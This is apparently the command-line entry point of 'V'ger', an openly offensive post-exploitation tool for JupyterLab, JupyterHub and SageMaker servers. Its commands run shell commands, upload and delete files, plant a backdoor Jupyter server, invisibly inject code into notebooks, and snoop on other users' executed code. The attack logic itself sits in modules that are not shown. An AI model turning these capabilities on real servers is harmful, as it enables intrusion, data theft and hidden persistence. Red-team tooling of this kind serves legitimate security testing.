from vger.menu import Menu
from vger.enumerate import Enumerate
from vger.exploit import Exploit
from vger.persist import Persist
from vger.connection import Connection
from vger.auth import AuthStrategy, TokenAuthStrategy, JupyterHubAuthStrategy, SageMakerIAMAuthStrategy
import typer
from typing_extensions import Annotated
from typing import Optional

app = typer.Typer(rich_markup_mode="rich", help="V'ger: Post-exploitation for Jupyter.")

# Common options for connection
PlatformOption = Annotated[str, typer.Option(help="Target platform.", case_sensitive=False, default="jupyterlab")]
HostOption = Annotated[str, typer.Option(help="Target server hostname/URL (e.g., http://localhost:8888/).")]
SecretOption = Annotated[Optional[str], typer.Option(help="Secret token or password (for JupyterLab).")] # Made optional
HubURLOption = Annotated[Optional[str], typer.Option(help="JupyterHub URL (if platform is jupyterhub).")]
HubTokenOption = Annotated[Optional[str], typer.Option(help="JupyterHub API token (if platform is jupyterhub).")]
SageMakerURLOption = Annotated[Optional[str], typer.Option(help="SageMaker Notebook/Studio URL or App ARN (if platform is sagemaker).")]
AWSProfileOption = Annotated[Optional[str], typer.Option(help="AWS CLI profile (for sagemaker).")]
AWSRegionOption = Annotated[Optional[str], typer.Option(help="AWS Region (for sagemaker).")]
NotebookOption = Annotated[Optional[str], typer.Option(help="Target notebook name or path (for notebook-specific commands).")]

def get_connection(platform: str, 
                   host: Optional[str] = None, 
                   secret: Optional[str] = None, 
                   hub_url: Optional[str] = None, 
                   hub_token: Optional[str] = None, 
                   sagemaker_url: Optional[str] = None, 
                   aws_profile: Optional[str] = None, 
                   aws_region: Optional[str] = None) -> Optional[Connection]:
    auth_strategy: Optional[AuthStrategy] = None
    effective_url = host
    # Create a temporary connection object to pass its print_with_rule to strategies for logging
    # This feels a bit clunky but allows strategies to use the same rich printing.
    # The connection object will be properly finalized after strategy instantiation.
    temp_connection_for_logging = Connection() 

    if platform.lower() == "jupyterlab":
        if not host or secret is None: 
            temp_connection_for_logging.print_with_rule("[CLI Error] For jupyterlab, --host and --secret are required.", category="Error")
            raise typer.Exit(code=1)
        auth_strategy = TokenAuthStrategy(secret)
        effective_url = host
    elif platform.lower() == "jupyterhub":
        if not hub_url or not hub_token:
            temp_connection_for_logging.print_with_rule("[CLI Error] For jupyterhub, --hub-url and --hub-token are required.", category="Error")
            raise typer.Exit(code=1)
        effective_url = hub_url 
        auth_strategy = JupyterHubAuthStrategy(
            hub_url=hub_url, 
            api_token=hub_token, 
            console_print_callback=temp_connection_for_logging.print_with_rule
        )
        # Message moved to within strategy
    elif platform.lower() == "sagemaker":
        if not sagemaker_url or not aws_region:
            temp_connection_for_logging.print_with_rule("[CLI Error] For sagemaker, --sagemaker-url and --aws-region are required.", category="Error")
            raise typer.Exit(code=1)
        effective_url = sagemaker_url
        auth_strategy = SageMakerIAMAuthStrategy(
            profile_name=aws_profile,
            region_name=aws_region,
            sagemaker_url_or_arn=sagemaker_url,
            console_print_callback=temp_connection_for_logging.print_with_rule
        )
        # Message moved to within strategy
    else:
        temp_connection_for_logging.print_with_rule(f"[CLI Error] Unsupported platform: {platform}. Choose from 'jupyterlab', 'jupyterhub', 'sagemaker'.", category="Error")
        raise typer.Exit(code=1)
    
    if not effective_url and not (isinstance(auth_strategy, JupyterHubAuthStrategy) or isinstance(auth_strategy, SageMakerIAMAuthStrategy)):
        # For Hub/SageMaker, effective_url might be resolved by the strategy itself using get_target_url.
        # For TokenAuth, effective_url (host) must be present.
        temp_connection_for_logging.print_with_rule(f"[CLI Error] Could not determine effective URL for platform {platform}. Host is likely required.", category="Error")
        raise typer.Exit(code=1)

    # Now create the final connection object for actual use
    # If we used temp_connection_for_logging directly, its auth_strategy wouldn't have been set when it was first created.
    # Instead, we pass the effective_url (which might be the base hub/sagemaker url) and the initialized strategy.
    # The Connection.__init__ will call auth_strategy.get_target_url() to get the final operational URL.
    connection = Connection(socket=effective_url, auth_strategy=auth_strategy)

    if not connection.auth_strategy: 
        temp_connection_for_logging.print_with_rule("[CLI Error] Auth strategy could not be initialized properly in Connection object.", category="Error")
        raise typer.Exit(code=1)
    
    # The connection.url should now be the fully resolved one (e.g. hub_url/user/username/)
    if not connection.url:
        connection.print_with_rule("[CLI Error] Connection URL could not be resolved by the authentication strategy.", category="Error")
        raise typer.Exit(code=1)

    # Attempt to connect and verify by listing sessions
    # This also serves to populate connection.jpy_sessions if successful
    connection.list_running_jpy_sessions()
    if not connection.jpy_sessions and platform.lower() != "jupyterlab":
        # For JupyterLab, it's okay if no sessions are running.
        # For Hub/SageMaker, if URL resolution worked but we can't list sessions, it's likely a problem.
        connection.print_with_rule(f"[CLI Warning] Could not list any running Jupyter sessions on {platform}. Target may be misconfigured or no notebooks running.", category="Warning")
        # Not exiting, as some server-level commands might still work, or user might want to debug.

    return connection

@app.command()
def interactive():
    """
    Interactive execution for [bold red]maximum functionality[/bold red]
    """
    Menu().main()


@app.command(rich_help_panel="Server-Level Interactions")
def terminal(platform: PlatformOption, code: str,
             host: HostOption = None, secret: SecretOption = None, 
             hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
             sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    Run a [bold red]shell command[/bold red] on the server
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Enumerate(connection).run_in_shell(interactive=False, code=code)

@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_list(platform: PlatformOption,
            host: HostOption = None, secret: SecretOption = None, 
            hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
            sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    List [bold red]running notebooks[/bold red] on the server
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Enumerate(connection).list_notebooks()


@app.command(rich_help_panel="Server-Level Interactions")
def file_list(platform: PlatformOption, dir_path: str = "/",
              host: HostOption = None, secret: SecretOption = None, 
              hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
              sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    List [bold red]directories[/bold red] or [bold red]file contents[/bold red]
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Enumerate(connection).list_dir(interactive=False, dir=dir_path)


@app.command(rich_help_panel="Server-Level Interactions")
def find_models(platform: PlatformOption, dir_path: str = "/",
                host: HostOption = None, secret: SecretOption = None, 
                hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
                sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    [bold red]Find models[/bold red] based on common file extensions
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Enumerate(connection).find_files_runner(
            file_type="model", interactive=False, path=dir_path
        )

@app.command(rich_help_panel="Server-Level Interactions")
def find_datasets(platform: PlatformOption, dir_path: str = "/",
                  host: HostOption = None, secret: SecretOption = None, 
                  hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
                  sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    [bold red]Find datasets[/bold red] based on common file extensions
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Enumerate(connection).find_files_runner(
            file_type="data", interactive=False, path=dir_path
        )

@app.command(rich_help_panel="Server-Level Interactions")
def file_upload(platform: PlatformOption, local_path: str, remote_path: str,
                host: HostOption = None, secret: SecretOption = None, 
                hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
                sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    [bold red]Upload a file[/bold red] to the server
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Exploit(connection).upload(
            interactive=False, in_path=local_path, out_path=remote_path
        )

@app.command(rich_help_panel="Server-Level Interactions")
def file_delete(platform: PlatformOption, file_path: str,
                host: HostOption = None, secret: SecretOption = None, 
                hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
                sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    [bold red]Delete a file[/bold red] on the server
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Exploit(connection).delete(interactive=False, path=file_path)


@app.command(rich_help_panel="Server-Level Interactions")
def backdoor_jupyter(platform: PlatformOption, port: int = 7777, new_secret: str = "",
                     host: HostOption = None, secret: SecretOption = None, 
                     hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
                     sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None,
                     target_notebook: NotebookOption = None):
    """
    Launch your own Jupyter server [green](it is a code execution service, after all)[/green]
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        if target_notebook: # If a notebook is specified for context
            exploit_instance = Exploit(connection, target_notebook=target_notebook)
            if not connection.target: # if _get_target failed in Exploit init
                print(f"[CLI Error] Could not set target notebook {target_notebook} for backdoor.")
                raise typer.Exit(1)
        # Persist expects a connection, and jupyter_backdoor will use connection.target if set
        Persist(connection).jupyter_backdoor(
            interactive=False, port=port, secret=new_secret
        )

@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_inject(platform: PlatformOption, notebook: str, code_path: str,
              host: HostOption = None, secret: SecretOption = None, 
              hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
              sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    [bold red]Invisibly inject[/bold red] code into a notebook
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Exploit(connection, target_notebook=notebook).inject(
            interactive=False, payload_path=code_path
        )

@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_history(platform: PlatformOption, notebook: str,
               host: HostOption = None, secret: SecretOption = None, 
               hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
               sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    Dump the history of a notebook to see [bold red]previously executed code[/bold red]
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Exploit(connection, target_notebook=notebook).dump_history()


@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_snoop(platform: PlatformOption, notebook: str, seconds: int = 60,
             host: HostOption = None, secret: SecretOption = None, 
             hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
             sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    Snoop on a notebook for a specified duration to see [bold red]code as it is executed[/bold red]
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Exploit(connection, target_notebook=notebook).snoop_for(interactive=False, timeout=seconds)


@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_modules(platform: PlatformOption, notebook: str,
               host: HostOption = None, secret: SecretOption = None, 
               hub_url: HubURLOption = None, hub_token: HubTokenOption = None,
               sagemaker_url: SageMakerURLOption = None, aws_profile: AWSProfileOption = None, aws_region: AWSRegionOption = None):
    """
    List [bold red]all available modules[/bold red] in a given notebook context
    """
    connection = get_connection(platform, host, secret, hub_url, hub_token, sagemaker_url, aws_profile, aws_region)
    if connection:
        Exploit(connection, target_notebook=notebook).list_modules()


if __name__ == "__main__":
    app()
